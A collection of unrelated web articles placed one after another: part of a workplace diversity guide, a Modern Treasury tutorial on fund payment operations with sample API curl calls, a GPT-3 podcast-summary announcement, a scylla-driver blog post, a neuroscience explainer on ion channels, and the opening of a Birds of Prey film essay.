href="https://www.coca-colacompany.com/shared-future/people-values#:~:text=We%20value%20diversity%20and%20inclusion,the%20better%20decisions%20we%20make.">Coca-Cola</a>, and <a href="https://www.accenture.com/ca-en/about/inclusion-diversity-index">Accenture</a>) but also internally. This helps employees feel proud of being part of an organization that cares for diversity and works towards a more equitable environment. Share goals and achievements and survey employees on said items to gauge if they are accurate reflections of the picture, and to understand if they agree with the direction the company is taking – to ensure collective participation and unity towards a common goal. Be mindful that there is a fine balance in reporting and celebrating workforce diversity to not oversaturate the organization’s vision. Keep it realistic to not create falsehoods and cynicism that can exacerbate division.</p></div></div><div data-id="6bbed9c" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><strong>3) Educate your company on diversity topics formally and informally:</strong> certain companies provide annual training to their employees on diversity. Despite controversial data on the effectiveness of diversity training, some advocates <a href="https://hbr.org/2017/07/two-types-of-diversity-training-that-really-work">defend that the practice can be effective when awareness and skill development is at the core of the training</a>. Topics and approaches may include:</p><ul><li>Fact case scenarios to better understand how to deal with a certain situation that may occur when interacting with individuals from different backgrounds and to discuss possible personal biases.</li><li>Perspective-taking exercises, as suggested by <a href="https://hbr.org/2017/07/two-types-of-diversity-training-that-really-work">HBR</a>, whereas individuals are given scenarios and required to respond by taking the perspective of minority groups such as females, LGBT, and racial minorities.</li><li>Research on the benefits of diversity, inclusion, and how the company plans to tie all of that to its culture and future objectives.</li><li>Refresher on policies that surround diversity and inclusion such as Anti-harassment policies, Anti-reprisal policies, Code of Ethics, etc.</li></ul></div></div></div><div data-id="d05aeed" data-element_type="widget" data-widget_type="text-editor.default"><div><p><strong>4) Promote transparency in decision-making:</strong> improve transparency in Human Resources decision making when it comes to hiring, promoting, firing, and training individuals. Honest and open communication on decision making can open the doors to create a sense of trust and respect between management and employees. Transparency also has the added bonus of increasing engagement when done appropriately and it trickles to topics beyond decision making. For instance, educating employees on open channels to report on misconduct or provide feedback, discussing challenges openly and appropriately, etc.</p></div></div><div data-id="62159b1" data-element_type="widget" data-widget_type="text-editor.default"><div><p><strong>5) Improve the onboarding process:</strong> pay special attention to the onboarding process as they can facilitate employee integration, helping them to feel engaged, included, and welcomed in the company. This process is essential to the success of every new employee, but it can be especially powerful to employees of diverse backgrounds which may often feel left out. A proper welcome and introduction to the resources, infrastructure, and assets available to them will go a long way. Ensure that during this process, employees are also made aware of special groups and communities (i.e. Toastmasters or Women in Leadership) available within the organization that they can join and be a member of. Whenever possible, provide the employee with a mentor or point of contact that can be reached out to for support. It can be a manager, coordinator, cubicle buddies or a more experienced employee with a similar job description. Be sure to let the point of contact know of the onboarding date, the name of the person and expected support that they will need to provide to the new hire.</p></div></div><div data-id="b5b63a4" data-element_type="widget" data-widget_type="text-editor.default"><div><p><strong>6) Leverage exit interviews:</strong> understand the power of exit interviews as they are uniquely positioned to gather information of soon to be former employees on what they consider to be company successes, challenges, and failures. Not only that, individuals feel more inclined to provide honest feedback since the perceived risk of losses are lower as they exit the company, and as such, the feedback can be more direct and targeted. It is important to understand that, depending on the circumstances in which the employment has ended, some of the opinions may be biased and may require that one does a bit more research before jumping into conclusions.</p></div></div><div data-id="c74dc9c" data-element_type="widget" data-widget_type="text-editor.default"><div><p><strong>7) Make actionable goals:</strong> Data gathered while surveying your employees and researching your organization’s demographic is valuable to craft SMART goals and objectives associated with enhancing diversity measures in your organization. Actionable goals ensure that teams can better grasp what’s needed to further advance diversity efforts in the organization. For instance, a broad goal such as “Increase the number of diverse hires” may not be as helpful as “Ensure that 100% of the job adds discuss diversity and secure at least 1 partnerships with universities and 1 partnership with an association whose representation is composed of individuals from a diverse background to advertise job posts”. The quantifiability and granularity of the latter statement allows employees to have clear insight into what needs to be done to accomplish a broader strategic goal associated with diversity.</p></div></div><div data-id="352f6e6" data-element_type="widget" data-widget_type="text-editor.default"><div><p><strong>8) Ensure that the organization’s culture, policies, and …</strong></p></div></div></div></div></div></div></div></section></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><em>Note: Modern Treasury empowers teams to make payment operations simple, scalable, and secure. The “Guides” series walks through representative businesses or payment processes and explains step by step how best to go about building them from scratch. ‍</em><br></p><p>‍</p><h4>Introduction</h4><p>Venture capital and private equity funds have become a large industry, with <a href="https://www.firstrepublic.com/-/media/frb/documents/pdfs/innovators/Preqin-and-First-Republic-Update-US-Venture-Capital-in-2019---V2.pdf?mkt_tok=eyJpIjoiWVRnNU1EZzBOREUzWVdZNSIsInQiOiJyY001aGduS01TZDRQejViQTladFVEK2c0VXY0VHh3MldCc0plK3VIaUhVUkxVeFRNZWd5N3" target="_blank">hundreds</a> of new funds getting started on an annual basis. They range in size from an angel investor investing a million dollars to giant growth and PE funds managing $100 billion or more.&nbsp;<br></p><p>The key to success lies in the investing decisions: attracting deal flow, identifying deals to invest in, winning those deals, and managing the companies to a successful outcome, be it an acquisition or IPO. But in addition to these there are the mechanics of fund operations, from receiving capital calls from Limited Partners (an “LP” is an investor in a fund), wiring funds to portfolio companies, receiving the proceeds from sales of the companies or sales of shares post IPO, and distributing those back to LPs.&nbsp;<br></p><p>For smaller funds, these operations tend to be outsourced to fund custodians, third parties that handle the backoffice of funds and manage incoming and outgoing wires. These third parties can get quite large. Some examples include <a href="https://www.gen2fund.com/" target="_blank">Gen II Fund Services</a>, <a href="https://www.bbh.com/en-us" target="_blank">Brown Brothers Harriman</a>, or <a href="https://www.ssctech.com/solutions/products-a-to-z/private-equity-services" target="_blank">SS&amp;C</a>. Larger firms often build an in-house team to manage these operations. But regardless of the specific organizational setup, the work tends to be quite similar, and the pressure on maintaining cost and accuracy leads to more <a href="https://www.privatefundscfo.com/7-reasons-us-private-equity-firms-are-finally-outsourcing-their-fund-administration/" target="_blank">focus</a> on automation.&nbsp;<br></p><p>This post is a guide to the operational, money movement aspects of private investing. While the specifics of the investments and the horizon for repayment might vary widely, we hope that this guide is useful in simplifying and demystifying how a fund might automate some of its internal operations.&nbsp;<br></p><p>‍</p><h4>The User Experience</h4><p>Let’s start with defining the user experience for a new fund. Let’s say our new team, which is expert in bagels, believes there’s a wave of innovation coming to that space. With Sesame, Everything, and Pumpernickel showing success in the market, more is coming. So, the team launches Bagel Ventures and raises a new venture fund (“Bagel Ventures I”) to invest in startups. They will raise their fund from 10 limited partners (LPs) who are the endowments, pension funds, and individuals investing in the fund. Bagel Ventures will not receive all the funds at the outset. Rather, they will ask for funds as they prepare for a new investment, and receive “capital calls” from each of the 10 LPs.&nbsp;<br></p><p>The fund flow might involve the following steps:</p><ol role="list"><li>The team identifies a new investment (“Have you heard of pickle bagels?!”).</li><li>The Fund sends capital call requests to all LPs, and receives 10 wires, one per LP.</li><li>The Fund wires the investment to the company.&nbsp;</li><li>After a while, the company sells and the Fund receives their share of the proceeds.</li><li>The Fund distributes the proceeds to the LPs, each getting what they are due, and keeps a carry fee for itself.&nbsp;<br></li></ol><p>In reality, things might be more complex. There could be multiple funding rounds for a company, and it might be a mixture of equity and debt. We haven’t accounted for fees. For simplicity’s sake, we will use only the case outlined above of a single investment round followed by an exit, and develop a payment ops architecture based on that.<br></p><p>‍</p><h4>Payment Ops Architecture</h4><p>Before setting up any payment flows, Bagel Ventures has to establish a banking relationship and open accounts. There might be an Operating Account for the fund for things such as payroll, rent, and other expenses, and a separate Investing Account for investments and distributions. For the purposes of this payment ops architecture, we’ll consider just the Investing Account.&nbsp;<br></p><p>Let’s assume you build for the following setup:&nbsp;<em>‍</em></p><figure id="w-node-2886e96df8b3-b8df1e0f"><p><img src="https://assets.website-files.com/5d7e7bbbcad517dd46cb55d3/5f467bc3a95047322fd177eb_Fund%20Custodian%202.jpg" loading="lazy" alt=""></p><figcaption>Investment phase: many capital call wires come in to the Investing Account to fund one investment wire to be sent to the company.</figcaption></figure><p>‍</p><figure id="w-node-9be230dca25d-b8df1e0f"><p><img src="https://assets.website-files.com/5d7e7bbbcad517dd46cb55d3/5f467b9c6f1a0d0f38966c77_Fund%20Custodian%201.jpg" loading="lazy" alt=""></p><figcaption>Exit phase: company sells, one wire arrives to the investing Account and is split into wires sent to many LP accounts and one Fund Operating Account for carry.</figcaption></figure><p>The Fund custodian team and software will oversee the regular collection and disbursement of investment funds, and make sure that everything is tracked and reconciled accordingly.</p><p>‍</p><h4>API Calls and Timings</h4><p>With this payment ops architecture in hand, we’re ready to build.&nbsp;</p><p>‍</p><h5>Step 1: Collect bank account details from LPs and from the Company</h5><p>Bagel Ventures first needs to collect the Company’s bank account details. Let’s call the company Pickle Bagels, Inc., and its first product is pickle bagels. To do so, you first create a counterparty in Modern Treasury, and populate it with the bank account and routing numbers you have received (<a href="https://www.moderntreasury.com/journal/how-to-collect-and-verify-bank-accounts-for-ach" target="_blank">more here</a> on common methods of authenticating accounts, such as Plaid):<br></p><h6>curl --request POST \<br>&nbsp;&nbsp;-u ORGANIZATION_ID:API_KEY \<br>&nbsp;&nbsp;--url https://app.moderntreasury.com/api/counterparties \<br>&nbsp;&nbsp;-H 'Content-Type: application/json' \<br>&nbsp;&nbsp;-d '{<br>&nbsp;&nbsp;"name": "Pickle Bagels, Inc.",<br>&nbsp;&nbsp;"accounts": [<br>&nbsp;&nbsp;&nbsp;&nbsp;{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"account_type": "checking",<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"routing_details": [<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"routing_number_type": "aba",<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"routing_number": "121141822"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;],<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"account_details": [<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"account_number": "123456789"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]<br>&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;]}'</h6><p>In addition to the account and routing number, you might want to hold additional information about the counterparty in metadata. This information might include how much of the fund that LP invested, any unique arrangements, and other information.</p><p>‍</p><h5>Step 2: Collect capital call wires</h5><p>A counterparty creation response will notify you that everything has been successfully set up. Now that a counterparty exists, you can initiate payments to or from LPs. If LPs allow this, you can ACH debit them for their contribution. More likely, however, the large amounts prevent the use of ACH and the preference is for wires, primarily because ACH is reversible and wires are not. To identify and automatically match the incoming wire, you can create an Expected Payment object for each incoming wire with the information you expect, such as amount, counterparty, payment type, and date range.&nbsp;This can be done over API&nbsp;or manually. As an example, here's what this might look like done manually: </p><figure id="w-node-2629a0d055b5-b8df1e0f"><p><img src="https://assets.website-files.com/5d7e7bbbcad517dd46cb55d3/5f4707cc10e4094e68ff9005_Screen%20Shot%202020-08-26%20at%206.04%201.jpg" loading="lazy" alt=""></p></figure><p>Now, once the expected payment is set up Modern Treasury will scan the account for this incoming information and automatically match it when it’s received. Alternatively, if the LP did not send the wire and the end of the date range has arrived, Modern Treasury will notify you that the fund has not received the expected funds.&nbsp;</p><p>‍</p><h5>Step 3: Fund the investment</h5><p>Once the funds have all arrived, you can fund the investment in Pickle Bagels, Inc. Let’s say Pickle Bagels is getting $10,000,000 from our Fund in this investment round, and is planning on A/B testing bagels and seeing which ones are gone fastest. Given the amount, you will most likely choose to send that amount via wire. Note that the amount is in cents, not dollars, so it shows up as 1000000000:<br></p><h6>curl --request POST \<br>&nbsp;&nbsp;-u ORGANIZATION_ID:API_KEY \<br>&nbsp;&nbsp;--url https://app.moderntreasury.com/api/payment_orders \<br>&nbsp;&nbsp;-H 'Content-Type: application/json' \<br>&nbsp;&nbsp;-d '{<br>&nbsp;&nbsp;"type": "wire",<br>&nbsp;&nbsp;"amount": 1000000000,<br>&nbsp;&nbsp;"direction": "credit",<br>&nbsp;&nbsp;"currency": "USD",<br>&nbsp;&nbsp;"originating_account": "Bagel Ventures account ID",<br>&nbsp;&nbsp;"receiving_account_id": "Pickle Bagels bank account ID",<br>&nbsp;&nbsp;"counterparty_id": "Pickle Bagels counterparty ID"<br>}'</h6><p>Once the payment goes through, the Fund account will be debited $10,000,000 and the Company will be funded for its next phase of bagel testing.&nbsp;</p><p>Finally, you want to add metadata to the payment for future reference. In addition to metadata tags (eg. key value pairs such as Type: SeriesA or Sector: Bageltech) you might also attach the PDF for the legal docs, or the CSV calculating the amounts, for future reference. This will be useful for finance and audit teams that might have to answer questions about this payment in the future.</p><p>‍</p><h5>Step 3: Receive funds at exit</h5><p>Now, after what could be a few months or a decade, Pickle Bagels, Inc. might sell and the fund will register a return on its investment. For simplicity, let’s assume the company sells in an all-cash transaction such that each investment comes back as a cash disbursement based on the terms of the sale agreement.&nbsp;</p><p>The Fund is notified that it will receive $30,000,000 back from the investment, tripling its original investment. In that case, you can set up an Expected Payment for the incoming funds, just as in Step 2 above, and reconcile an incoming wire when it comes in from the acquiring company.&nbsp;<br></p><p>‍</p><h5>Step 4: Disburse the investment return</h5><p>Finally, once you’ve reconciled the incoming wire, you can collect the Fund’s fees by transferring those funds to the Operating account, and setting up a disbursal to each of the investors in ten separate wires.&nbsp;<br></p><p>That’s it. With these four actions you can set up the payment ops architecture for a simple private investment fund and focus on finding the right entrepreneurs and companies to back and invest in.&nbsp;<br></p><p>‍</p><h4>What Can Go Wrong?</h4><p>Payment operations software, such as <a href="https://www.moderntreasury.com/" target="_blank">Modern Treasury</a>, can manage not only the happy path as described above but also edge cases when things go wrong. A common issue could be handling an ACH return associated with a specific <a href="https://docs.moderntreasury.com/reference#ach-return-reason-codes" target="_blank">return code</a>.&nbsp;<br></p><p>Another might be a customer service issue if an LP funds too little or too much funds, combines two investments in one, or makes some other unexpected action. In that case, there might be a new transaction necessary or an explanatory note for future reconciliations or audits. Ops teams can process these easily while maintaining the integrity of the data, since all payments sent or received are easily captured and displayed. In the future, accountants and auditors won’t be left wondering about a wire, since the information explaining it can be captured directly tied to the bank statement in question.&nbsp;<br></p><p>‍</p><h4>More?</h4><p>This post laid out a simple architecture for payment ops at a VC or PE fund, …</p></div></div></div>

			<p>Open AI’s GPT-3 has been in the news a lot recently for a number of reasons. Developers have used this new API to do things from <a href="https://www.theverge.com/2020/8/16/21371049/gpt3-hacker-news-ai-blog">writing blog posts that make it to the top of Hacker News</a>, to <a href="https://www.businessinsider.in/tech/news/10-things-gpt-3-can-do-examples-and-use-cases/slidelist/77449901.cms#slideid=77450339">creating search engines and more</a>.</p>
<p>Today, we’re happy to announce you can add <strong>podcasts</strong> to the list of things GPT-3 is beginning to revolutionize!</p>
<p>The HyperCatcher app has now applied this exciting technology to our premium podcasts. Using GPT-3 and a little other magic you can now view a summary of your favorite podcasts before you listen. You can even jump past topics you’re not interested in (or commercials) and get to the good stuff more easily than ever!</p>

<figure><img loading="lazy" src="https://secureservercdn.net/104.238.71.109/g6p.a50.myftpupload.com/wp-content/uploads/2020/08/2020-08-19-22.06.45.gif" alt="" width="321" height="671"></figure>
<h2>How Did We Do It?</h2>
<p>GPT-3 is a cutting edge machine learning model that’s been trained on content across the internet. This makes GPT-3 the perfect model for creative text generation. GPT-3 or a subsequent Machine Learning model from OpenAI might be great at creating podcasts from scratch one day given a topic, but we’re not quite there yet. One step removed from whole cloth podcast creation is summarizing existing podcasts and that’s exactly what we’re using GPT-3 for!</p>
<p>With GPT-3 the hard part is coming up with the right question and the right format for the question that will prompt the AI to fill in the answer with the right mix of creativity and understanding of the given question.</p>
<p>For example, if you sign up for Open AI’s beta you’ll get access to the GPT-3 playground that comes loaded with some preset prompts. One of these prompts is:</p>
<p>My second grader asked me what this passage means:</p>
<p>From here you can fill in the paragraph with a sample passage. For example, we could use a paragraph of text from a podcast like so:</p>
<p><em>My second grader asked me what this passage means:</em></p>
<p><em>“they age they saved money for a rainy day but this is four months that’s a long time miss you know what it’s not eat but it is to live a normal life with a car payment and a mortgage and a Verizon bill yeah that’s a lot of money but but you know what people shouldn’t have car payments”</em></p>
<p>Plugging this into the GPT-3 playground we might get a result like this:</p>
<p><em>I told her that it meant he was going to miss her and be sad because she’s not there. She said, “no, I think he’s saying that he doesn’t have a car payment.”</em></p>
<p>That’s pretty creative, but it’s not exactly a summary of the given text</p>
<p>This is where some of the parameters given by the API allow us to tweak the creativity and length of the response come in handy. In addition to tweaking parameters we might also give a few examples of what we consider “good” summaries of text that GPT-3 can use as a reference.</p>
<p>After applying those changes GPT-3 will give us something more like this:</p>
<p><em>“People shouldn’t have car payments.”</em></p>
<p>Now, we can basically feed a transcript of the entire podcast to GPT-3 in chunks and retrieve summaries of each part of the podcast that can be displayed to users!</p>

<p>At <a href="https://www.ultrabug.fr/scylla-summit-2019/" target="_blank" rel="noreferrer noopener">Scylla summit 2019</a> I had the chance to meet <strong>Israel Fruchter</strong> and we dreamed of working on adding <strong>shard-awareness</strong> support to the Python cassandra-driver which would be known as <strong>scylla-driver</strong>.</p>



<p>A few months later, when Israel reached out to me on the Scylla-Users #pythonistas Slack channel with the <a rel="noreferrer noopener" href="https://github.com/scylladb/python-driver/pull/6" target="_blank">first draft PR</a> I was so excited that I jumped in the wagon to help!</p>



<p>The efforts we put into the scylla-driver paid off and significantly improved the performance of the production applications that I had the chance to switch to using it by 15 to 25%!</p>



<figure><img loading="lazy" width="1024" height="587" src="https://www.ultrabug.fr/wordpress/wp-content/uploads/2020/08/2020-07-23-174931_1276x731_scrot-1024x587.png" alt="" srcset="https://www.ultrabug.fr/wordpress/wp-content/uploads/2020/08/2020-07-23-174931_1276x731_scrot-1024x587.png 1024w, https://www.ultrabug.fr/wordpress/wp-content/uploads/2020/08/2020-07-23-174931_1276x731_scrot-300x172.png 300w, https://www.ultrabug.fr/wordpress/wp-content/uploads/2020/08/2020-07-23-174931_1276x731_scrot-768x440.png 768w, https://www.ultrabug.fr/wordpress/wp-content/uploads/2020/08/2020-07-23-174931_1276x731_scrot-1200x687.png 1200w, https://www.ultrabug.fr/wordpress/wp-content/uploads/2020/08/2020-07-23-174931_1276x731_scrot.png 1276w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Before we reached those numbers and even released the scylla-driver to PyPi, EuroPython 2020 RFP was open and <a href="https://ep2020.europython.eu/talks/a-deep-dive-and-comparison-of-python-drivers-for-cassandra-and-scylla/" target="_blank" rel="noreferrer noopener">I submitted a talk proposal which was luckily accepted </a>by the community.</p>



<p>So I had the chance to deep-dive into Cassandra vs Scylla architecture differences, explain the rationale behind creating the scylla-driver and give Python code details on how we implemented it and the challenges we faced doing so. Check my talk spage for </p>



<p>I also explained that I wrote an <a rel="noreferrer noopener" href="https://groups.google.com/g/scylladb-dev/c/SUx0OBlY7iw" target="_blank">RFC on the scylla-dev mailing list</a> which lead the developers of Scylla to implement a new connection-to-shard algorithm that will allow clients connecting to a new listening port to select the actual shard they want a connection to.</p>



<p>This is an expected major optimization from the current mostly random way of connecting to all shards and I’m happy to say that <a rel="noreferrer noopener" href="https://github.com/scylladb/scylla/commit/1572b9e41cd02e8b676404ba72a549398d281a66" target="_blank">it’s been implemented</a> and is ready to be put to use by all the scylla drivers.</p>



<p>I’ve recently been contacted by PyCon India and other Python related conferences organizers for a talk so I’ve submitted one to PyCon India where I hope I’ll be able to showcase even better numbers thanks to the new algorithm!</p>



<p>After my Europython talk we also had very interesting discussions with Pau Freixes about his work on a <a rel="noreferrer noopener" href="https://github.com/pfreixes/acsylla" target="_blank">fully asynchronous Python driver that wraps the C++ driver</a> to get the best possible performance. First results are absolutely amazing so if you’re interested in this, make sure to give it a try and contribute to the driver!</p>



<p>Stay tuned for more amazing query latencies 😉</p>

        <p>A few weeks ago, for various reasons I decided to start reading a neuroscience textbook (<a href="https://www.sciencedirect.com/book/9780123858702/fundamental-neuroscience" target="_blank" rel="noopener">Fundamental Neuroscience</a>). Though dense, it’s packed with interesting information that filled a lot of gaps in my knowledge about the brain.</p>
<p>One of those gaps was about how exactly the information travels through a neuron. Up to this point, all I knew was “something involving electric pulses”. </p>
<p>The reality, it turns out, is more interesting: neurons use ion channels to create and strengthen electric signals, and propagate information along their lengths.</p>
<p>So here is more or less how I understand this so far.</p>
<p>First, a quick recap of the neuron structure.</p>
<p><img src="https://i-kh.net/images/the-magic-of-ion-channels/neuron-overview.png" alt="A typical neuron. Source: your brain."></p>
<p>A neuron has the main cell body. From that body, it grows a large number of branched extensions called “dendrites”. These usually serve as the input “wires”, though they also do some signal processing. </p>
<p>Neuron usually also grows another long extension called an “axon”. This is normally the cell’s output, and it can be up to a meter long in humans, though in the brain it’s usually shorter.</p>
<p>Let’s zoom in to the axon. First, we’ll look at shorter axons, because longer ones have myelin sheath, which will complicate the picture.</p>
<p>The fluid inside the neuron (cytoplasm) and the intercellular fluid between the neurons have a number of ions dissolved in them: calcium (Ca²⁺), potassium (K⁺), sodium (Na⁺), chlorine (Cl⁻), and others.</p>
<p>For various reasons, neurons actively work to pump out Na⁺, Ca²⁺, and Cl⁻, so these are much more concentrated outside the cell than inside the cell. If the membrane wasn’t keeping them out, they’d quickly rush into the cell. Some still leak back in.</p>
<p>Similarly, neurons actively work to concentrate K⁺ inside.</p>
<p><img src="https://i-kh.net/images/the-magic-of-ion-channels/pumping-ions.png" alt="A crude depiction of a Na⁺-K⁺ pump, one of the mechanisms maintaining the ion balance in the neuron. Na⁺-K⁺ pump removes three Na⁺ ions for two K⁺ ions."></p>
<p>Each of the ions carries a charge, so the end result of this pumping is that the cell’s inside is negatively charged relative to the outside. This voltage difference is called the “membrane potential”. Resting membrane potential is typically between -75 and -40 mV (millivolts).</p>
<p>Ion channels are small valves set in the cell’s surface that let ions through if certain conditions are met. Some are opened by specific chemicals binding to them (e.g. neurotransmitters), while others open when the voltage inside the cell rises high enough. The latter are called “voltage-gated ion channels”, and they’re the ones we’re interested in.</p>
<p>Voltage-gated ion channels exist on all parts of a neuron, but are most concentrated in the axon. Most let through a specific ion: there are Na⁺ channels, K⁺ channels, Ca²⁺ channels, etc. </p>
<p>Let’s take a look at how Na⁺ channels and K⁺ channels would work to produce a voltage spike (called an “action potential”). </p>
<p><img src="https://i-kh.net/images/the-magic-of-ion-channels/ion-channels-1.png" alt="Neuron membrane in resting state. Channels are closed; membrane voltage is around -73 mV."></p>
<p>If something increases the cell membrane voltage to -55 mV, Na⁺ channels quickly open and let in a lot of Na⁺ ions. These ions carry a positive charge, so they quickly raise the voltage across the membrane to +30 mV. Then the channels automatically close. This happens over the span of milliseconds.</p>
<p>At the same time, K⁺ channels open and start letting out some K⁺ ions, opposing the Na⁺ current and slowing the voltage increase. The channels first open slowly, but after a while, the K⁺ current strengthens. </p>
<p><img src="https://i-kh.net/images/the-magic-of-ion-channels/ion-channels-2.png" alt="Voltage spikes up after the channels open. Na⁺ are flowing quickly, and K⁺ are flowing slowly. Na⁺ channel is about to close."></p>
<p>To start, Na+ channels dominate, but after they close, K⁺ outflow quickly makes the membrane voltage drop. This drop overshoots the initial resting level before leveling off at the voltage where K⁺ concentrations stay stable.</p>
<p>Then K⁺ channels gradually close.</p>
<p><img src="https://i-kh.net/images/the-magic-of-ion-channels/ion-channels-3.png" alt=" Na⁺ channel is closed. K⁺ has concentrations have leveled off around -73 mV, where K⁺ ions are equally likely to enter and exit the membrane."></p>
<p>The total number of ions exchanged throughout the whole process is minuscule, and has little impact on the overall concentration of ions inside or outside the cell.</p>
<p>When the channels create a voltage spike, they then trigger other nearby channels, which then trigger other channels, and so on. This makes the voltage spike travel down the length of the neuron. </p>
<p>The ion channels usually take time to reset before the next firing, so a single voltage spike doesn’t usually set off the entire neuron ringing indefinitely. However, the voltage can propagate from the base of the axon back into the dendrites, where it can play an important role in influencing whether the next incoming signal will set off the ion channels there.</p>
<p>Neurons are somewhat conductive, but not <em>very</em> conductive - they’re not copper wires. They’re also leaky - a large portion of their current seeps out into the surrounding intercellular fluid, partly because the cell membrane is not 100% impermeable to ions, and partly because of the membrane capacitance.  </p>
<p>That means that if a given ion channel generates some voltage locally, that voltage will quickly drop off as we move farther from that channel.</p>
<p>So the ion channels cannot be spaced too far apart, and the signal will travel only as fast as the channels can open and close between the start and the end of the axon.</p>
<p>Vertebrates (including humans) have a clever innovation to speed up the propagation of signals: they use myelin sheaths to insulate axons that travel over distances longer than millimeters.</p>
<p><img src="https://i-kh.net/images/the-magic-of-ion-channels/myelin-sheath.svg" alt="Myelin sheaths surrounding an axon of the peripheral nervous system (i.e. outside the brain or spine). Source: &quot;Anatomy and Physiology&quot; by the US National Cancer Institute's Surveillance, Epidemiology and End Results (SEER) Program."></p>
<p>Myelin sheaths form in 0.2- 1 mm segments over the neurons and are made from layers of cell membrane and protein made by the dedicated cells - oligodendrocytes in the brain and spinal cord, and by Schwann cells everywhere else.</p>
<p>Myelin significantly thickens the axon’s wall and reduces the amount of current leaked out through the cell membrane. This allows the myelinated neuron to space their ion channels farther apart, significantly speeding up the propagation of the voltage spikes.</p>

<p>Comic book film fans seem to be the most inconsistent bunch in terms of what they love to hate. From tone-deaf reviews, to frothing Twitter outrage, we’re looking at a group that has something to say about everything, even films they’ve never seen, and aren’t planning to.</p>



<p>Contrary to this, I’m pretty open. Though a DC fan, I do appreciate when the MCU knocks it out of the park. The latest two Avengers films, Deadpool, Winter Soldier, Iron Man, Guardians of the Galaxy, Dr. Strange, Spiderman: Homecoming, and Logan all easily come to mind.</p>



<p>I try to go into media without any expectations. Because of this, I’m usually pleasantly surprised.</p>



<p>However, when I watch a piece of media, I do have a requirement: <em>I want to feel something.</em></p>



<p>I want style, I want risk, and I want to care when a character suffers, dies, thrives, or survives. I’m looking for art, not explosions.</p>



<p><em>The spectacle of CGI-laden superhero battles grows pale in the face of art. </em></p>



<p>I wrongly assume most comic book nerds feel the same, considering <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Joker_(2019_film)" target="_blank">Joker </a>and <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Logan_(film)" target="_blank">Logan</a> were universally lauded as genre-breaking. They deserve that accolade.</p>



<p><strong>But what of Birds of Prey?</strong></p>



<p>You might be shaking your head at the moment; <em>silly Weeb, Birds of Prey is bad.</em> My response would simply be: <strong>why?</strong></p>



<div><figure><img data-attachment-id="1227" data-permalink="https://weebtrash.ga/2020/08/27/why-do-people-hate-birds-of-prey/why-do-people-hate-birds-of-prey/" data-orig-file="https://i2.wp.com/weebtrash.ga/wp-content/uploads/2020/08/why-do-people-hate-birds-of-prey.gif?fit=498%2C249&amp;ssl=1" data-orig-size="498,249" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="why-do-people-hate-birds-of-prey" data-image-description="" data-medium-file="https://i2.wp.com/weebtrash.ga/wp-content/uploads/2020/08/why-do-people-hate-birds-of-prey.gif?fit=300%2C150&amp;ssl=1" data-large-file="https://i2.wp.com/weebtrash.ga/wp-content/uploads/2020/08/why-do-people-hate-birds-of-prey.gif?fit=498%2C249&amp;ssl=1" loading="lazy" width="498" height="249" src="https://i2.wp.com/weebtrash.ga/wp-content/uploads/2020/08/why-do-people-hate-birds-of-prey.gif?resize=498%2C249&amp;ssl=1" alt="" data-recalc-dims="1"></figure></div>



<p>Why is there so much criticism lobbed at a film that delights in its art and embraces shirking tradition? Why do people find it cloying over a refreshing departure from same-same-same?</p>



<p><em>How can people hate Birds of Prey when Robbie delivers an Oscar-worthy performance over the death of an egg sandwich!?</em></p>



<p>I went on the hunt for such an answer. Here are my unsurprising findings, and my unsurprising—albeit disappointing—conclusion.</p>



<h2>Fractured narrative in Birds of Prey is the issue</h2>



<h3>Yet, other comic book movies provide the same exact flaw…</h3>



